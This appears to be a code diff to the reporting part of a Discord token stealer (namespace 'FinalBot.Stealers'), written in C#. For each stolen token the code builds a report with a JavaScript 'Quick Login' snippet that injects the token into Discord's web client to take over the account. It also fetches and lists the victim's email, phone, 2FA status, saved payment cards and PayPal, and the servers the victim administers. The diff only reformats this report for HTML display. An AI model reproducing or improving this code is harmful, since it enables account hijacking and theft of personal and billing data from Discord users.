@@ -7,6 +7,7 @@ using System.Linq;
 using System.Security.Cryptography;
 using System.Net.Http;
 using System.Net.Http.Headers;
+using System.Net;
 using System.Threading.Tasks;
 using Newtonsoft.Json.Linq;
 
@@ -54,68 +55,67 @@ namespace FinalBot.Stealers
             if (tokens.Count == 0) return "❌ No Discord tokens found.";
 
             var report = new StringBuilder();
-            report.AppendLine("💎 ✨ **DISCORD ANALYSIS REPORT** ✨ 💎");
-            report.AppendLine("🌐 *Scanning native modules and leveldb...*");
+            report.AppendLine("💎 ✨ <b>DISCORD ANALYSIS REPORT</b> ✨ 💎");
+            report.AppendLine("🌐 <i>Scanning native modules and leveldb...</i>");
             
             using (var client = new HttpClient())
             {
                 foreach (var token in tokens)
                 {
-                    report.AppendLine("\n📡 " + $"`{token}`");
+                    report.AppendLine("\n📡 " + $"<code>{token}</code>");
                     
                     // Quick Login Script
-                    string quickLogin = "```javascript\n" + 
-                                       "(function(token){try{window.webpackChunkdiscord_app.push([[Symbol()],{},e=>{for(let r of Object.values(e.c)){if(r.exports?.default?.updateToken){r.exports.default.updateToken(token);break;}}}}])}catch(e){}try{window.localStorage.setItem('token', '\"' + token + '\"');}catch(e){}setTimeout(()=>{location.reload()},500);})('" + token + "')\n" +
-                                       "```";
-                    report.AppendLine("💠 **Quick Login:**\n" + quickLogin);
+                    string quickLogin = "<code>" + 
+                                       WebUtility.HtmlEncode("(function(token){try{window.webpackChunkdiscord_app.push([[Symbol()],{},e=>{for(let r of Object.values(e.c)){if(r.exports?.default?.updateToken){r.exports.default.updateToken(token);break;}}}}])}catch(e){}try{window.localStorage.setItem('token', '\"' + token + '\"');}catch(e){}setTimeout(()=>{location.reload()},500);})('") + token + WebUtility.HtmlEncode("')") +
+                                       "</code>";
+                    report.AppendLine("💠 <b>Quick Login:</b>\n" + quickLogin);
 
                     var info = await GetAccountInfo(client, token);
                     if (info != null)
                     {
-                        report.AppendLine($"👤 **User:** `{info["username"]}`");
-                        report.AppendLine($"🆔 **ID:** `{info["id"]}`");
-                        report.AppendLine($"📧 **Email:** `{info["email"] ?? "N/A"}` ✅");
-                        report.AppendLine($"📱 **Phone:** `{info["phone"] ?? "N/A"}`");
-                        report.AppendLine($"🛡 **2FA:** `{(info["mfa_enabled"]?.ToString() == "True" ? "🟢 On" : "🔴 Off")}`");
+                        string user = WebUtility.HtmlEncode(info["username"]?.ToString() ?? "Unknown");
+                        report.AppendLine($"👤 <b>User:</b> <code>{user}</code>");
+                        report.AppendLine($"🆔 <b>ID:</b> <code>{info["id"]}</code>");
+                        report.AppendLine($"📧 <b>Email:</b> <code>{WebUtility.HtmlEncode(info["email"]?.ToString() ?? "N/A")}</code> ✅");
+                        report.AppendLine($"📱 <b>Phone:</b> <code>{WebUtility.HtmlEncode(info["phone"]?.ToString() ?? "N/A")}</code>");
+                        report.AppendLine($"🛡 <b>2FA:</b> <code>{(info["mfa_enabled"]?.ToString() == "True" ? "🟢 On" : "🔴 Off")}</code>");
 
-                        string nitro = (int)info["premium_type"] switch
+                        string nitro = (int)(info["premium_type"] ?? 0) switch
                         {
                             1 => "Nitro Classic",
                             2 => "Nitro",
                             3 => "Nitro Basic",
                             _ => "None"
                         };
-                        report.AppendLine($"💎 **Nitro:** `{nitro}`");
-                        report.AppendLine($"🌍 **Locale:** `{info["locale"]}`");
-                        report.AppendLine($"👥 **Friends:** `{info["friends_count"]}`");
+                        report.AppendLine($"💎 <b>Nitro:</b> <code>{nitro}</code>");
+                        report.AppendLine($"👥 <b>Friends:</b> <code>{info["friends_count"]}</code>");
 
                         if (info["billing_info"] is JArray cards && cards.Count > 0)
                         {
-                            report.AppendLine($"\n💳 **Billing ({cards.Count}):**");
+                            report.AppendLine($"\n💳 <b>Billing ({cards.Count}):</b>");
                             foreach (var card in cards)
                             {
-                                string type = card["type"]?.ToString() == "1" ? "💳 Credit Card" : "💰 Paypal";
+                                string type = card["type"]?.ToString() == "1" ? "💳 Card" : "💰 Paypal";
                                 string brand = card["brand"]?.ToString() ?? "N/A";
                                 string last4 = card["last_4"]?.ToString() ?? "****";
-                                string exp = $"{card["expires_month"]}/{card["expires_year"]}";
-                                report.AppendLine($"   {type} {brand} *{last4} ({exp})");
+                                report.AppendLine($"   {type} {brand} <b>{last4}</b>");
                             }
                         }
                         else
                         {
-                            report.AppendLine("\n💳 **Billing:** ❌ No cards");
+                            report.AppendLine("\n💳 <b>Billing:</b> ❌ No cards");
                         }
 
                         if (info["admin_guilds"] is JArray guilds && guilds.Count > 0)
                         {
-                            report.AppendLine($"🏰 **Admin Servers ({guilds.Count}):**");
-                            string guildList = string.Join(", ", guilds.Select(g => g["name"]?.ToString()));
-                            report.AppendLine($"   {guildList}");
+                            report.AppendLine($"🏰 <b>Admin Servers ({guilds.Count}):</b>");
+                            foreach(var g in guilds.Take(5))
+                                report.AppendLine($"   • 🛡️ {WebUtility.HtmlEncode(g["name"]?.ToString() ?? "Unknown")}");
                         }
                     }
                     else
                     {
-                        report.AppendLine("⚠️ **Invalid/Expired Token**");
+                        report.AppendLine("⚠️ <b>Invalid/Expired Token</b>");
                     }
                     report.AppendLine("——————————————————————————————");
                 }
